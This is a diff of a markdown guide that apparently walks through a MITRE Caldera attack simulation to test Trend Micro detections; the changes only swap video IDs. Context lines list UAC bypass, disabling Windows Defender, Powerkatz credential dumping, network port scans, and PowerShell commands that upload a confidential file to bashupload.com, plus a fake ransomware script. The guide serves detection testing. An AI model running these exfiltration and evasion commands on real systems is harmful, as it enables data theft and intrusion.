@@ -23,7 +23,7 @@ We are using Caldera as one of the tools to help us evaluate how Cloud One Workl
 Before you start with the attack simulation, be sure you updated the Mitre Caldera Global Configurations.
 You must replace the IP Address (0.0.0.0) with the Public IP Address you are using to access the Mitre Caldera management console.
 
-{{< youtube id="V4AxIqFGqrU" >}}
+{{< youtube id="9X5A4A54ZHI" >}}
 
 ---
 #### Initial Access and Execution
@@ -43,7 +43,7 @@ References:
 - PS1toEXE - https://ps2exe.azurewebsites.net/
 - Online Storage - https://filebin.net/
 
-{{< youtube id="RNCU0wbkEuk" >}}
+{{< youtube id="Fvo7lh-mYDA" >}}
 
 
 ---
@@ -52,19 +52,19 @@ Using Mitre Caldera, you can deploy additional backdoors that will ensure you ca
 
 In our case, we can run a remote instruction on the affected Linux computer and deploy a secondary agent (bot).
 
-{{< youtube id="ECAPmLFwiXY" >}}
+{{< youtube id="tZk7Xs7n7tE" >}}
 
 ---
 #### Privilege Escalation
 Using Mitre Caldera, you can deploy the Technique "UAC bypass registry (T1548.002) - Set a registry key to allow UAC bypass". It will help to to expand the impact of this attack and get additional permissions on the affected OS.
 
-{{< youtube id="o-hCzQjhNLs" >}}
+{{< youtube id="ehafYxLNmoI" >}}
 
 ---
 #### Defense Evasion
 Using Mitre Caldera, you can deploy the Technique "Disable Windows Defender All (T1562.001) - Disable Windows Defender All".
 
-{{< youtube id="w5pnVRvGS6k" >}}
+{{< youtube id="-YbaI1s7v2s" >}}
 
 ---
 #### Credential Access
@@ -76,7 +76,7 @@ After you run the initial command, run also the following instructions (availabl
 
 - Powerkatz (Staged)	
 
-{{< youtube id="syO6uPBEhQc" >}}
+{{< youtube id="gwi4jE8BLUk" >}}
 
 ---
 #### Discovery
@@ -88,7 +88,7 @@ As result of the previous command, you will find active connections on the netwo
 - powershell C:\Users\Public\IPv4NetworkScan.ps1 -IPv4Address 10.0.10.0 -Mask 255.255.255.0 -DisableDNSResolving;
 - foreach ($port in 444..3390) {If (($a=Test-NetConnection 10.0.10.12 -Port $port -WarningAction SilentlyContinue).tcpTestSucceeded -eq $true){ "TCP port $port is open!"}}
 
-{{< youtube id="lfZNiSudO5o" >}}
+{{< youtube id="CWmCC_bjaWA" >}}
 
 
 ---
@@ -97,7 +97,7 @@ As a next step of this demo, we are going to do lateral movement and exfiltrate 
 
 Then using the Potential Links, select the technique "View remote shares (T1135)", and update it with the 10.0.10.12 IP Address.
 
-{{< youtube id="x2drqoxbxPc" >}}
+{{< youtube id="lErMomcmH_0" >}}
 
 ---
 #### Command & Control
@@ -110,7 +110,7 @@ Using Mitre Caldera, you can deploy the Technique "Find files (T1005) - Locate f
 
 - CMD - type c:\confidential\confidential.txt
 
-{{< youtube id="5cW3VaHpMis" >}}
+{{< youtube id="BYGdESV0F7A" >}}
 
 ---
 #### Exfiltration
@@ -119,7 +119,7 @@ Now that we have access to the secondary server, its time to exfiltrate the sens
 - Invoke-WebRequest -Uri https://bashupload.com/ -Method Post -ContentType multipart/form-data  -Body c:\confidential\confidential.txt
 - Invoke-RestMethod -Uri https://bashupload.com/ -Method Post -InFile c:\confidential\confidential.txt -UseDefaultCredentials
 
-{{< youtube id="PY8fKsBejy4" >}}
+{{< youtube id="TNuvzg40CEE" >}}
 
 ---
 #### Impact 1 - (Fake) Ransomware
@@ -131,10 +131,10 @@ After having the Risk Control Rule in place, you can execute the following comma
 
 - PS1 - powershell.exe -command C:\Users\Public\Ransom.ps1;
 
-{{< youtube id="ESWP8knaRl4" >}}
+{{< youtube id="Jisl28z33U4" >}}
 
 ---
 ## Reviewing the Detections 
 Review the Vision One Portal (Risk Insights and XDR / Workbenchs and OAT) searching for the evidences of the instructions executed during this demo.
 
-{{< youtube id="A-mIm0YG-OM" >}}
+{{< youtube id="7Y8AkK-M2js" >}}
